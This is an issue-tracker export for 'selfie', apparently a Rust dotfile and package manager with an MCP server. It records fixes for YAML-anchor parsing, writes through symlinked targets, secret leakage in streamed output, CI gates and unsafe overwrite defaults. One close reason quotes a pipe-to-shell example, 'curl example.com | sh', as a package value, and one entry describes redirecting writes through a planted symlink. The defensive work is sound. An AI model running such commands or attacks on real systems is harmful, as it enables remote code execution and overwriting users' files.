title: deny_unknown_fields on DotfileEntry reintroduces the YAML anchor bug 826e854 fixed
description:
Commit 826e854 ('fix: allow YAML anchors while still catching unknown fields') removed #[serde(deny_unknown_fields)] from Package, EnvironmentConfig and DotfileEntry, replacing detection with a flatten-into-HashMap plus a validation pass that permits underscore-prefixed anchor keys and reports anything else as a field-level error. Provider-sourced dotfiles re-added the attribute to DotfileEntry to catch a 'var:' for 'vars:' typo, which reintroduces the bug that commit fixed.

Verified empirically against the merged tree:
  _anchor: &a hello  inside a dotfiles entry  ->  REJECTED, 'unknown field _anchor'
That is the exact '_brew: &brew' case named in 826e854's message.

Second consequence: a typo inside a dotfiles entry now fails the WHOLE package file to parse, so it drops out of valid_packages, taking that package's other dotfiles and all its install and check commands with it. The user gets 'skipping unparsable package file' rather than a field-level diagnostic naming the key, and none of the package's other issues are checked.

The typo-catching goal is right and the regression test for it should stay. The mechanism is the one already tried and deliberately backed out. Fix by extending the existing flatten-plus-validate mechanism down to DotfileEntry rather than by the attribute, so anchors keep working and a typo produces a field-level error.
acceptance_criteria: A YAML anchor inside a dotfiles entry parses; a misspelled key produces a field-level validation error rather than failing the whole file.
close_reason:
Fixed in PR #71 (merged 6786b48). deny_unknown_fields replaced with a hand-written Deserialize for DotfileEntry that records unrecognized keys into unknown_keys and skips _-prefixed ones, so YAML anchors parse again and a misspelled key produces a field-level error instead of failing the whole package file. content_source() returns the existing ContentSource::Invalid so apply refuses the entry — fail-closed.

Two fail-open paths were found by review and closed in the same PR:
1. Removing deny_unknown_fields alone made apply report Success/deployed_count:1 while writing an unrendered '{{ api_key }}' over a credentials target. Found at the plan gate.
2. save_package re-serializes from the struct, so any load-mutate-save silently deleted the offending key and the NEXT apply deployed the credentials file. Guard placed inside save_package rather than at its callers — there are five production call sites, two of which (spec create, standalone dotfiles track) were on nobody's list. Found at final review.

serde(flatten) was deliberately avoided: it forecloses Spanned<T> on these fields, which d96b82c had to back out of Package for, and would block selfie-2wb.

Residual documented and tracked: selfie-kj5y (a _-prefixed key shadowing a real field, e.g. _vars:, deploys unrendered with no diagnostic).

title: Dotfile deploys write through symlinked targets
description:
expand_user_path (crates/selfie/src/dotfile_service/service.rs:226) calls FileSystem::expand_path, which canonicalizes (crates/selfie/src/fs/real.rs:43). Canonicalization resolves symlinks, so perform_deploy receives a symlink-resolved target and writes through any symlink at the target path, silently overwriting the link's destination rather than replacing the link.

Security-relevant on its own: a symlink planted at a dotfile target redirects written content to a path the planter chose. It also nullifies the symlink protection of write_file_private for any caller that canonicalizes first, which constrains how secret-bearing dotfiles must resolve their target.

Deciding the right behavior is the work here: replacing a symlinked target is a behavior change for users who deliberately symlink their dotfiles, so this is not simply 'stop canonicalizing'.
acceptance_criteria: Deploy either refuses to write through a symlinked target or does so only by explicit opt-in; behavior is documented and tested.
notes:
Provider-sourced dotfiles (selfie-doh) deliberately does NOT route secret targets through expand_user_path. It uses its own expand_secret_target, which expands ~ and normalizes . and .. but never canonicalizes, so the final path component reaches write_file_private unresolved and its symlink guarantee actually holds for credential writes.

That divergence is intentional and load-bearing, not an oversight. Whoever fixes this issue must UNIFY the two expansions by bringing the repo-file path up to the secret path's behavior — not by deleting the secret path's expansion in the name of removing duplication, which would silently reintroduce the vulnerability for credentials.
close_reason:
Fixed in PR #72 (merged 78ae893). Deploy now REFUSES a symlinked target via libc::O_NOFOLLOW rather than writing through it; the link and its destination are left untouched, a warning names both paths, and the entry is counted as skipped.

The bead's diagnosis was incomplete. Canonicalization in expand_user_path was half of it — fs::write follows a final-component symlink regardless — but fixing only the write leaves the main case broken, because the expansion hands the write site an already-resolved destination. Measured: each half alone produces IDENTICAL wrong behavior (destination overwritten, counted as deployed, no warning), which is why neither can be dropped as cleanup.

Three layers: expand_target_path no longer canonicalizes (the former expand_secret_target, body unchanged — the repository path was brought UP to the credential path's behavior, never the reverse); a check hoisted into handle_apply so dry-run does not preview a refused deploy and the conflict resolver is never asked an unanswerable question; and O_NOFOLLOW at the write as the only TOCTOU protection, pinned by the_writer_refuses_even_when_the_check_is_blinded (a decorator test with an AtomicUsize control).

REPLACE-the-symlink was considered and rejected: measured, it destroys a deliberate symlink on the unprompted RepoChanged path on the first ordinary apply after any repo edit. Opt-in to follow symlinks deliberately is selfie-paa5.

Ten attacks verified refused including the dangling-link case the bead predicted was already safe; TOCTOU confirmed kernel-enforced over 200 plant-then-write rounds.

title: Re-enable CI and cut Actions minute burn
description:
CI (.github/workflows/ci.yml) was disabled_manually ~2026-03-25 because Actions minutes were being exhausted on this private repo. Result: ~4 months of pushes to main with zero automated verification. All four gates (typos, dprint, fmt, clippy, tests) pass locally on main today, so the workflow should go green once re-enabled.

Re-enable it, and reduce per-run cost so the credit problem does not recur:
- Skip runs for beads-only commits (9 of last 19 commits touched only .beads/issues.jsonl, each firing a full 5-job run).
- Consolidate 5 jobs into 2 to stop paying per-job minute rounding and a duplicated Rust compile across the clippy and build-and-test runners.
acceptance_criteria: CI workflow is enabled; a run on main completes green; per-run billable minutes reduced; beads-only commits do not trigger a run.
close_reason: CI re-enabled and green on PR #64; beads-only commits now skipped

title: MCP apply defaults auto_accept=true — silently overwrites divergent configs (data loss)
description: selfie_apply_dotfiles (MCP) defaults auto_accept=true, which auto-accepts DeployDecision::Conflict and overwrites the target (service.rs:661). A Conflict happens when a target exists, has no local deploy-state (NotTracked), and its content DIFFERS from the repo source — exactly the fresh-second-machine case (e.g. deploying home's configs onto the work machine, which has its own unpushed edits). Result: the other machine's config is silently clobbered with NO prompt. This violates the 'no silent failures / no data loss' principle and is worst on the AI-native path (the primary use case). Fix: when there is no interactive resolver (MCP/headless), the SAFE default must be to SKIP conflicts and report them (auto_accept=false), requiring explicit opt-in to overwrite. Consider also surfacing the diff in the conflict event so an AI/user can decide. Surfaced 2026-07-23 reasoning through cross-machine deploy safety.
close_reason: MCP apply now defaults auto_accept=false; conflicts skipped+reported with diff. Fixed in 3238cd6, test apply_param_defaults_auto_accept_to_false

title: Phase 1: Add recommends (soft deps) and login shell execution
description: Add 'recommends' field to package YAML for soft dependencies that install but don't cascade failure. Add --no-recommends flag. Switch CLI to login shell for install/check/audit (matching MCP server). See docs/superpowers/specs/2026-03-18-environment-manager-design.md
close_reason: Phase 1 shipped in PR #28

title: Standardize symbols — remove rogue emoji
description: P1: Several commands use emoji outside the canonical symbol system (✓ ✗ ⚠ ℹ ✨). Rogue emoji: 📋 in check.rs and validate.rs (results headers), 💡 in common.rs (suggestions — should use print_suggestion/✨), ⚠️ with variation selector U+FE0F in check.rs (renders as color emoji, looks different from text ⚠ used elsewhere). Fix: replace 📋 with a DisplayManager section header method, replace 💡 with print_suggestion, replace ⚠️ with ⚠.

description: P1: Half the commands bypass DisplayManager with bare println!(). This breaks MultiProgress coordination (will corrupt spinner output in Phase 2) and causes inconsistent stdout/stderr routing. Affected: check.rs, validate.rs, info.rs, list.rs summary, common.rs display_environment_summary/display_generic_environment_suggestion. Every user-facing output line should go through DisplayManager methods.

title: Fix failing build
description: GitHub CI has been failing because of dprint failures. Fix that and update our local claude hooks to run `dprint fmt` after code changes
close_reason: Fixed: ran dprint fmt on 6 markdown files, added dprint fmt to PostToolUse hook, pushed to uat

title: Add dependency chain integration tests
description: The install handler resolves dependencies recursively, but tests don't exercise this path. Need tests for: single dependency, chain dependencies (A->B->C), missing dependency, and circular dependency (once detection is implemented). Use mock repo returning packages with dependency chains.
close_reason: Implemented circular dependency detection with DFS topological sort in deps.rs, restructured install handler for dependency chains, added 8 unit tests and 5 integration tests

title: Implement PackageService::create properly
description: PackageService::create returns a placeholder 'Create operation not yet implemented'. The CLI's create.rs bypasses PackageService entirely and directly uses PackageRepository -- constructing Package objects and GetPackage structs with pub fields. This breaks the hexagonal pattern. Implement the service method and have the CLI call it instead of going direct to the repository.
close_reason: Encapsulated GetPackage fields and implemented PackageService::create

title: Add circular dependency detection
description: The dependency resolution in install.rs follows dependencies linearly without cycle detection. If a user creates a cycle (A depends on B, B depends on A), installation would likely recurse infinitely or deadlock. Add cycle detection using a visited set to PackageService::install and/or validate.
close_reason: Implemented circular dependency detection with DFS topological sort in deps.rs, restructured install handler for dependency chains, added 8 unit tests and 5 integration tests

title: secrets.md mandates truncate_stderr but audit.rs violates it and two crates cannot call it
description:
selfie-ppp adds a rule to .claude/rules/secrets.md: 'truncate_stderr in commands/runner.rs is the one bound; call it rather than deciding a limit per site.' Two problems make that rule unfollowable as written.

1. AN EXISTING SITE ALREADY VIOLATES IT. crates/selfie/src/package/service/audit.rs:310-318 builds AuditResult::Error(format!("Audit command failed (exit code {exit_code}): {stderr}")) with the stderr UNBOUNDED. That value reaches the event stream and is serialized into the MCP JSON. Pre-existing, not introduced by selfie-ppp, and the same class the ppp bound exists to close.

2. TWO CRATES CANNOT OBEY IT. truncate_stderr is pub(crate) to selfie, so selfie-cli and selfie-mcp cannot call it — yet secrets.md's paths: frontmatter scopes the file to crates/cli/src/commands/track.rs among others. A reader in those crates is told to call a function they cannot reach.

Fix needs both halves: route audit.rs through the shared bound, and decide the visibility. If the rule is meant to apply outside selfie, truncate_stderr must be pub; if it is selfie-internal, the rule should say so and the adapters need their own guidance.

Found by the final reviewer on selfie-ppp.
acceptance_criteria: Every site that forwards a command's stderr goes through the shared bound, and the rule names a function its readers can call.

title: Leak tests scan for the secret literal, so a Vec<u8> Debug of the same bytes goes undetected
description:
The repo's leak-regression tests assert that a secret string does not appear in formatted output — assert_no_event_mentions scans format!("{events:?}") for the literal.

Debug on Vec<u8> does not render the literal. It renders [115, 51, 99, ...]. So a leak that formats a bytes field with {:?} carries exactly the same secret material and passes every existing scan.

This is a live gap in the EXISTING tests, not a hypothetical one about future tests. ResolvedContent (crates/selfie/src/dotfile_service/resolve.rs:38) is 'pub bytes: Vec<u8>' on a pub(crate) struct — the type has no Display and a hand-written Debug printing '<N bytes>', which is real structural protection, but the field itself is reachable and a {:?} on it needs no string conversion at all.

FIX, and this is the part worth doing properly: have assert_no_event_mentions take the secret as BYTES and check both renderings itself — the literal and format!("{:?}", secret.as_bytes()) — so the choice is not re-made per test and the gap closes in the tests that already exist. Asserting both at each call site works but rebuilds the blind spot the next time someone adds a test.

Found while planning selfie-ppp; sharpened by that unit's plan reviewer.
acceptance_criteria: A Debug of a secret-bearing byte slice fails the leak-regression tests, not just a Debug of a secret string.

title: No gate keeps Justfile recipes in sync with ci.yml, and they have drifted before
description:
selfie-blkr fixes the pre-commit-check skill by delegating to the Justfile, so the skill can no longer drift from the gates. That relocates the single point of failure rather than eliminating it: nothing checks that the Justfile's recipes still match .github/workflows/ci.yml.

This is not hypothetical. Commit 7c03c46 (PR #32, 2026-03-22) shipped a 'clippy' recipe WITHOUT '-- -D warnings' — selfie-blkr's exact bug, one layer down — and it was caught only by a Copilot review comment, then fixed in 61a0b77. Nothing would catch it today.

Known divergences right now, both currently harmless:
  - just fmt-check runs 'cargo fmt --check'; CI runs 'cargo fmt --all -- --check'. Verified equivalent in this virtual workspace (bare cargo fmt covers all members), so the strings differ but the behavior does not.
  - 'just check' omits typos and cargo build, which CI runs as separate jobs. Deliberate, and selfie-blkr now documents it in the skill.

Suggested fix: a test or CI step asserting the Justfile's gate recipes contain the same commands ci.yml runs. Parsing 'just -n <recipe>' output and comparing against the workflow's run: lines is cheap and catches the 7c03c46 class directly.

Found by the code review on selfie-blkr, which noted that the fix's own claim ('Justfile is the source of truth so this skill cannot drift') is true of skill-vs-Justfile drift and silent about Justfile-vs-CI drift.
acceptance_criteria: A weakened or diverged Justfile gate recipe is caught automatically rather than by a reviewer noticing.

title: Streamed command stdout is unconditional egress to both the terminal and MCP clients
description:
execute_command_streaming (crates/selfie/src/package/service/steps.rs:127-138) emits every line of a command's stdout as PackageEvent::Info { output: ConsoleOutput::Stdout(..) }, on success and on failure alike. Both adapters render it verbatim:
  - MCP: event_to_json serializes it as {"type":"output","text":...} (crates/mcp-server/src/event_collector.rs:133-139)
  - CLI: printed via println! (crates/cli/src/event_processor.rs:376-384)

Reproduced by the author of selfie-ppp: a command printing a secret to stdout put that secret in the MCP JSON.

Scope is 'selfie package install' only — check (check.rs:253) and audit (audit.rs:263) use the non-streaming execute path. That makes it narrower than selfie-ppp's framing but NOT smaller in consequence: for install, the stdout is fully public before any failure occurs, so selfie-ppp's fix to the failure-summary path does not touch it.

This is deliberately NOT a bug in the streaming feature itself — people want to watch 'brew install' run, and gutting that is not what selfie-ppp asks. The questions are:
  1. Should streamed command output be suppressible (a quiet flag, or off by default for commands marked as touching credentials)?
  2. Is streaming raw command output to an MCP client appropriate at all? A terminal is watched by the human who wrote the command; an MCP client is an AI agent with a transcript, and the trust model differs.

Found while tracing every exit for selfie-ppp; held out of that unit's scope deliberately.
acceptance_criteria: Streamed command output is either suppressible, or the decision to stream it unconditionally to both adapters is documented with its risk.
notes:
SCOPE WIDER THAN FILED, per the selfie-ppp plan reviewer:
  - The route carries STDERR as well as stdout — steps.rs:130 and :133 stream both as PackageEvent::Info, and event_to_json serializes both arms identically.
  - It fires on SUCCESS as well as failure, so a credential echoed by a command that then succeeds is exposed with no failure to draw attention to it.
  - 'install only' is slightly too strong: audit's stdout reaches MCP in parsed form as 'sources' (audit.rs:265-270 -> audit_details -> event_collector.rs:331-334). By design, but it is a second path. 'check' genuinely does not — check_status_label returns a fixed string.

That combination makes this the BROADEST exit described anywhere in .claude/rules/secrets.md: nothing on the path is truncated, redacted, or conditional. selfie-ppp adds a bullet to secrets.md naming it.

title: _dotfiles at package top level silently drops every dotfile in the package
description:
A package written with '_dotfiles:' instead of 'dotfiles:' loses every dotfile with no signal whatsoever.

Verified against bfff27b by the author of selfie-n310:
  pkg.validate(env).issues().all_issues()  ->  []            (validate reports NOTHING)
  apply  ->  Success(DotfilesApplied { deployed_count: 0, skipped_count: 0, steps_completed: 0/0 })

The user gets a successful run that did nothing, with no warning, no error, and no count indicating anything was skipped. Nothing distinguishes it from a package that legitimately has no dotfiles.

Cause: validate_unknown_fields (crates/selfie/src/package/validate.rs:238) skips ALL underscore-prefixed top-level keys, because the underscore prefix is how 826e854 made YAML anchors legal. Same class as selfie-kj5y, one level up: kj5y is an underscore key shadowing a known field INSIDE a dotfile entry, this is one shadowing a known field at the top level.

The fix is symmetric to kj5y's and about one line: flag a _-prefixed top-level key whose remainder appears in KNOWN_PACKAGE_FIELDS. Note KNOWN_PACKAGE_FIELDS does NOT contain 'target', so the '_target: &target ~/.config/bat/config' anchor documented at docs/package-files.md:797 stays legal — that scoping is load-bearing and must be preserved.

Deliberately excluded from selfie-kj5y's scope, which the bead confines to 'inside a dotfile entry'. Whether to fold it into that unit or fix separately is being decided; if selfie-n310's unit takes it, close this against that PR.
acceptance_criteria: A _-prefixed top-level key that shadows a known package field is refused by apply, not only reported by validate, while legitimate top-level anchors stay legal.
notes:
THE ONE-LINE FIX IS NOT SYMMETRIC WITH kj5y's, and that is why this must not be folded into selfie-n310's unit. Found by the plan reviewer on selfie-n310.

kj5y's fix lands in the hand-written Deserialize (package.rs:288) -> unknown_keys -> content_source() -> apply warns and skips. It reaches APPLY.

A top-level fix would land in validate_unknown_fields (validate.rs:238), which re-parses raw_yaml and is reached ONLY from Package::validate — and apply does not run validation. That is the entire premise of selfie-n310.

So the 'symmetric one-liner' would make 'selfie spec validate' report _dotfiles while 'selfie apply' continued to silently deploy nothing. Folding it into n310's unit would ship a false closure inside the one unit whose thesis is that validate-only is not enough.

Making apply catch it requires a design decision: record top-level unknown keys on Package (parallel to DotfileEntry::unknown_keys, which is what PR #71 built for entries), or the whole-package validation gate that n310's unit measured and rejected (7 test failures, including one PR #71 wrote specifically to assert the opposite shape).

ACCEPTANCE IS THEREFORE STRICTER THAN FILED: refused by APPLY, not only reported by validate.

Related: validate_unknown_fields is also inert when raw_yaml is empty or unparsable (validate.rs:229-233), so a programmatically built Package never gets top-level unknown-key diagnostics at all — see selfie-t8t2.

title: spec edit re-serializes the package before opening the editor, flattening anchors and comments
description:
crates/cli/src/commands/spec/edit.rs:63 calls common::save_package BEFORE handing the file to $EDITOR. Two consequences.

1. Every 'selfie spec edit' silently rewrites the user's YAML through serde even when they change nothing: anchors are flattened to their expanded values, comments are dropped, and key order and formatting are normalized. The user opens their editor and finds their file already altered by the act of opening it.

2. After selfie-6lz4, it is unusable on exactly the file you need it for. A package carrying an unrecognized key (e.g. 'var:' for 'vars:') is refused by the new save_package guard, so spec edit exits 1 and never opens the editor — telling the user to correct the key using the tool that just refused to let them. Recoverable by editing the YAML by hand, and refusing is strictly safer than the pre-fix behavior of silently laundering the typo, but the instruction loop is self-contradictory.

The pre-save appears to serve no purpose for an unmodified package. Likely fix: do not re-serialize before opening the editor; save only after the user's edits, or not at all if the editor writes the file in place.

Found by the final reviewer on selfie-6lz4. selfie-6lz4 makes the refusal message actionable as a stopgap; this issue is the underlying behavior.
acceptance_criteria: Opening a package with spec edit does not rewrite it, and a package with an unrecognized key can still be opened for editing.

title: A _-prefixed key that shadows a real dotfile field deploys credentials unrendered with no diagnostic
description:
selfie-6lz4 makes any _-prefixed key inside a dotfiles entry legal, so YAML anchors work. Correct and required. But it means a key that SHADOWS a real field is silently accepted.

Measured on the selfie-6lz4 branch:
  source: u/creds.tpl + _vars:   -> DEPLOYED, target contains 'api_key: {{ api_key }}' unrendered
  _source: u/plain.txt alone     -> skipped as Invalid (no real source, so refused anyway)
  source: u/plain.txt + _: 1     -> deployed (harmless)

The _vars case is the dangerous one: the bindings are silently dropped, the entry is not secret-bearing, and the template deploys with literal placeholders over a credentials target. 'selfie spec validate' on that package reported NOTHING for it — the only diagnostic was for the unrelated _source entry. So there is no signal from apply or from validate.

selfie-6lz4 documents this hazard in docs/package-files.md, which is a defensible response given the parent bead requires _ keys to be legal. But documentation is the weakest available mitigation for a silent credential failure, and the mitigation space is not empty.

Suggested direction from the final reviewer: flag a _-prefixed key whose remainder matches a KNOWN dotfile field (_vars, _source, _command, _target) as an error INSIDE a dotfile entry, while leaving all other _ keys alone. That keeps anchors working — nobody names an anchor _vars by accident — while closing the shadowing case. Consider whether the same rule should apply at the top level.

Filed so the decision is recorded rather than only documented.
acceptance_criteria: A _-prefixed key that shadows a known dotfile field produces a diagnostic, or the decision not to flag it is recorded with its reasoning.
close_reason:
Fixed in PR #75 (merged 97ff4ad).

selfie-n310: ContentSource::Invalid deleted; DotfileEntry::content_source() returns Result<ContentSource, InvalidEntry>. Both options the bead named were measured and rejected — a whole-package validation gate fails 7 tests including one asserting a bad entry is skipped WHILE the package's other dotfiles still deploy, and a ValidatedPackage type would be constructed at one internal site (apply_all takes no packages) so it is that gate wearing a type.

The claim is deliberately limited and the code says so: the compiler forces a decision at 11 of 11 consumers where 5 were forced before; it does NOT make dropping impossible, since 'let Ok(x) = ... else { continue }' still compiles. Each consumer has a regression test asserting the refusal is REPORTED, which is the guard on that residual.

The concrete hole closed: ContentSource's Display had an Invalid arm, so a malformed entry was printable as though it named a source.

selfie-3c5a: refused before any command runs. Verified by running the same test against both commits — at base the credential fetch fired ('op read op://Private/rubygems/token') and the target was written; after, zero calls and no file, across apply, drift and dry-run.

selfie-kj5y: a _-prefixed key shadowing a known dotfile field is refused. Boundaries verified against built code: _source/_command/_vars/_target refused inside an entry; _anchor, _brew, _targets, __vars and bare _ still legal; the documented TOP-LEVEL _target anchor still parses and resolves through its alias.

TWO THINGS ADDED ON MAINTAINER REVIEW, both from the same root cause — validation was gating on a deploy-path classification:
1. template_dotfiles() no longer routes through content_source(), so a bad var name no longer suppresses 'declared but never used' for other vars in the same entry. docs/package-files.md:576 already stated that rule unqualified; the code had drifted from the docs.
2. The apply-time command notice counted via command_count(), which returns 0 for a refused entry — so 'vars: { not-a-name: curl example.com | sh }' produced SILENCE from the check meant to help judge whether to trust a package. It now counts what the entry declares. command_count() is unchanged for apply's dry-run: validation asks what the file declares, apply asks what it will run, with a test pinning them to agree for every valid shape.

crates/selfie/src/package/validate.rs now contains no call to content_source() at all.

NOT closed by this: n310's motivating anecdote, a templated source escaping the package directory. That was a missing containment guard on a perfectly VALID Template; root cause is selfie-zv4b.

title: dotfiles drift reports a symlink-refused entry as 'repo changed' forever with no explanation
description:
After selfie-4m9 a dotfile whose target is a symlink is refused at apply and never deployed. 'selfie dotfiles drift' then reports it as 'repo changed' on every run, permanently, because the repo file's checksum keeps moving away from a target that is never updated.

docs/sync.md points users at 'drift' as the command for details on what is out of sync. It is therefore the one command a confused user is most likely to reach for, and it is the one command that cannot tell them the word 'symlink'. The user sees persistent drift with no cause and no remedy.

Verified by probe during selfie-4m9 implementation. Deliberately left silent in that unit because drift is a read-only command and adding a filesystem stat to it is a behavior change beyond a P1's scope — but that was a decision made in passing rather than a recorded one, which is why this exists.

Options: have drift stat the target and report 'refused: target is a symlink', or have it report the entry as blocked rather than changed.
acceptance_criteria: A dotfile refused because its target is a symlink is reported by drift with the reason, not as an unexplained permanent 'repo changed'.
notes:
CONTRADICTORY OBSERVATIONS from two agents, both plausible — resolve before fixing.

The selfie-4m9 author reported drift shows a refused entry as 'repo changed' FOREVER. The selfie-4m9 final reviewer reported the opposite: handle_check_drift (service.rs:1389) expands the target the same way but reads THROUGH the link and checksums the DESTINATION, so it reports 'in sync' for a target apply will refuse to write.

Both are reachable and neither is wrong — which one you get depends on whether the symlink destination's content happens to match the repo file. Destination matches -> 'in sync' while apply refuses. Destination differs -> 'repo changed' permanently, because the target never updates.

So the real defect is broader than first filed: drift and apply DISAGREE about what a symlinked target is, in both directions, and drift cannot say the word 'symlink' either way. Pre-existing rather than introduced by selfie-4m9 (drift already read through links), but selfie-4m9 makes it user-visible by giving apply a refusal that drift does not model.

Fix should make drift describe the target the same way apply does.

title: dotfiles track accepts a symlinked target silently, deferring the refusal to a later apply
description:
After selfie-4m9, 'selfie apply' REFUSES to deploy to a symlinked target. But 'selfie dotfiles track' still accepts one without comment and records it as tracked.

The user therefore learns nothing at the moment they could act cheaply — when they are standing at the target, know why the symlink is there, and could 'rm' it in seconds — and instead gets a refusal at the next apply, possibly weeks later, with the context gone.

Verified by probe during selfie-4m9 implementation.

track already knows the target path and can stat it. It should say at track time that the target is a symlink and that apply will refuse it, ideally naming the destination. Whether it should refuse to track outright, or track with a warning, is the substance of this issue: refusing is more consistent, warning is friendlier if the user intends to remove the link before applying.

Related: selfie-paa5 would add an opt-in to follow symlinks, which changes what track should say.
acceptance_criteria: Tracking a symlinked target tells the user at track time that apply will refuse it.

title: Make the never-canonicalize-a-target rule structural instead of prose
description:
Before selfie-4m9, the no-canonicalization rule on the credential path was enforced STRUCTURALLY: two separate expanders existed (expand_user_path, which canonicalized, and expand_secret_target, which did not), and .claude/rules/secrets.md said do not merge them. A mistake in the repository-file expander physically could not reach credentials.

selfie-4m9 unifies them into one non-canonicalizing expand_target_path — which the bead required, and which is correct, because de-canonicalization turned out to be load-bearing for the repository path too. But the blast radius goes up: one function now serves both paths, and a single edit to it (someone 'fixing' the /tmp vs /private/tmp duplicate-detection regression by reaching for expand_path) reopens the hole for credentials simultaneously. The only thing standing in the way afterwards is a sentence in a rules file.

.claude/rules/testing.md states the preference directly: 'A compile error beats a test... prove it by making the violation fail to build.' .claude/rules/verification.md states it too: 'An invariant you can state is not an invariant the code enforces.'

Proposal: a TargetPath newtype constructible ONLY by the non-canonicalizing expander, with the write primitives accepting TargetPath rather than &Path. A call site that canonicalizes then writes would fail to compile. Roughly 9 call sites today (7 for the former expand_user_path, 2 for the former expand_secret_target).

Deliberately not done inside selfie-4m9 — a type refactor across every target-path call site should not ride on a P1 security fix. Confirmed with the maintainer 2026-07-29.
acceptance_criteria: A call site that canonicalizes a dotfile target path before writing fails to compile, rather than being caught only by a rules-file sentence.

title: is_secret_bearing() has no production callers — a guard that guards nothing
description:
DotfileEntry::is_secret_bearing (crates/selfie/src/package.rs:270) is public API with a name that reads as a safety predicate. Verified with 'grep -rn is_secret_bearing crates --include=*.rs': the only hits are its own definition and five assertions in package.rs tests. No production code path calls it.

So either it is dead public API, or it is a guard someone intended to call on the apply path and did not. The five tests assert it returns the right answer, which makes it look maintained and load-bearing while nothing consults it — the tests are the only consumer.

This matters more than a typical dead-code finding because of what it is named. .claude/rules/secrets.md records three leak paths found by three different reviewers and concludes 'assume there is a fourth'. A reviewer scanning for how selfie distinguishes secret-bearing entries will find this method, read its five green tests, and reasonably conclude the distinction is enforced somewhere. It is not.

Resolve by either deleting it, or finding the call site it was written for and wiring it up.

Found by the plan reviewer on selfie-6lz4.
acceptance_criteria: is_secret_bearing is either removed or called from the production path it was written to guard.

title: pre-commit-check skill runs clippy without -D warnings, the exact trap CLAUDE.md warns about
description:
.claude/skills/pre-commit-check/SKILL.md:10 runs 'cargo clippy --all-targets' and labels it 'zero warnings policy' on the same line. That form does NOT fail on warnings.

CLAUDE.md:25 and CLAUDE.md:37 both warn about precisely this: the bare form under-reports, CI runs '-- -D warnings', and using the bare form locally ships a warning to a red build. The skill that exists to automate the pre-commit checklist runs the under-reporting form, so an agent that dutifully invokes the skill gets a green report and then a red CI.

Fix: change step 2 to 'cargo clippy --all-targets -- -D warnings' to match CLAUDE.md's documented CI form.

Also worth checking while there: the skill omits 'dprint fmt', which is step 2 of CLAUDE.md's four-step pre-commit checklist and is enforced by 'dprint check' in CI. So the skill under-covers the checklist in two ways.

Found by the plan reviewer on selfie-4b7.
acceptance_criteria: The pre-commit-check skill runs the same clippy form CI runs, and covers every step of the CLAUDE.md pre-commit checklist.
notes:
RESOLUTION CHANGED 2026-07-29 by the maintainer. The skill is being DELETED, not corrected.

Reasoning, which is the same insight the fix itself was built on: the skill duplicated a checklist already present in CLAUDE.md and already loaded every session. That duplication is what produced this bug. Correcting the skill's commands (or delegating them to the Justfile) fixes the instance and leaves the mechanism; deleting the skill removes the second copy entirely.

CLAUDE.md's pre-commit checklist is being rewritten to delegate to 'just check' plus 'just test-lib' (settling selfie-it6l), to state that passing is not the same as CI being green, and to record the maintainer's formatting policy. selfie-cm1h is folded into the same edit.

Acceptance is therefore satisfied differently than filed: the skill cannot run the wrong clippy form because the skill no longer exists.
close_reason:
Fixed in PR #73 (merged d9bb7f9).

selfie-blkr: the pre-commit-check skill was DELETED rather than corrected. It duplicated a checklist CLAUDE.md already carries and already loads every session, and that duplication is what let the two drift apart. CLAUDE.md's checklist now delegates to 'just check', so no second copy of the commands exists to weaken. Premise verified empirically rather than restated: on an isolated copy with a planted clippy::needless_return, 'cargo clippy --all-targets' exits 0 while printing the warning and '-- -D warnings' exits 101 on identical code.

selfie-it6l: resolved differently than the bead framed it. The question assumed a hand-picked crate+feature invocation was the right instrument. selfie is the only crate in the workspace with an optional feature (with_mocks; mockall is the only optional=true dependency), so it was the only crate worth isolating and nothing said why. CI now runs 'cargo hack --each-feature test -p selfie', covering all four combinations instead of the one the workspace run produces, and extending itself if a second feature appears. Removed from the local checklist: the break can only reach main through a PR, and CI gates PRs. Verified the replacement is a strict superset — deleting test-common's features line fails cargo-hack on pass 2 of 4 with the predicted from_parts error, and the old gate exits 101 on the same mutation.

selfie-cm1h: the trailing sentence was retensed and its citation historicized rather than deleted, so it still explains why obsolete '--features with_mocks' instructions exist elsewhere. Worth recording why this was more than a P4 nit: THREE independent agents misread that sentence during this batch — one reported CLAUDE.md as stale, one claimed 'just test-lib' would fail every time and cited it as proof, one filed it as a stale-docs finding on an unrelated PR. All three were wrong. The mechanism, diagnosed by the selfie-ppp author, is that all three misread a TRAILING CLAUSE qualifying an earlier claim; a reader who stops at the first assertion gets the opposite meaning. The fix leads with 'The command compiles today.' as a standalone sentence.

title: A corrupt deploy-state file is silently swallowed, turning routine applies into conflicts
description:
load_deploy_state (crates/selfie/src/dotfile_service/service.rs:217) ends in unwrap_or_else(|_| DeployState::empty()). An unparseable or truncated state file is therefore replaced by an empty one with no error, no warning, and no event.

Consequence: every tracked dotfile suddenly looks NotTracked. Routine applies that would have been quiet Skip-or-update decisions become conflicts, and the user is prompted about files selfie has managed for months with no indication that the state file is the reason. Answering those prompts then overwrites the state with a fresh empty-derived one, destroying whatever was recoverable.

Silent fallback on corrupt persistent state is the failure mode selfie-hat records the user's principle about: selfie must not fail silently — if it can proceed, it should, but it must say what it ignored.

Should emit a warning event naming the state file and the parse error, and consider preserving the corrupt file rather than overwriting it.

Found while planning selfie-4m9.
acceptance_criteria: A deploy-state file that fails to parse produces a warning event naming the file, rather than being silently replaced by an empty state.

title: DeployEntry::target is recorded but never read, so a changed target orphans the old file
description:
record_deployment stores DeployEntry::target in the deploy state, but nothing ever reads it for a decision — DeployState::detect_drift keys on source alone.

Consequence: if a package's 'target:' is edited, the state entry keyed by the unchanged source still matches. Drift is then computed against the NEW target while the OLD target file is left on disk, silently orphaned, with no event telling the user a file was abandoned. selfie no longer manages it and never mentions it again.

Either use the stored target to detect that the configured target moved (and emit an event, or clean up), or drop the field so the state file does not carry data that implies a guarantee it does not provide.

Found while planning selfie-4m9. Note that selfie-4m9 changes the recorded target string from a canonicalized path to the as-configured path; that change is only safe BECAUSE the field is never read, which is exactly the coupling this issue is about.
acceptance_criteria: Either a changed target is detected and reported using the recorded value, or the unused field is removed.

title: EnvironmentConfig has no unknown-field detection
description:
Unknown keys inside an environments.<env> block are silently dropped. Verified empirically: 'environments.test.instal: typo' (for 'install') parses clean and produces ZERO validation issues.

'install' is required, so a bare misspelling of it is caught by serde's 'missing field' error. But 'chekc:' for 'check:', 'dependancies:' for 'dependencies:', and 'recomends:' are all silently ignored — the user gets no signal that the key did nothing.

Same class of bug as selfie-6lz4, one level down. validate_unknown_fields (crates/selfie/src/package/validate.rs:195) already walks top-level keys and, after selfie-6lz4, walks dotfiles entries; extending it to EnvironmentConfig fields is the same shape of change plus a KNOWN_ENVIRONMENT_FIELDS const.

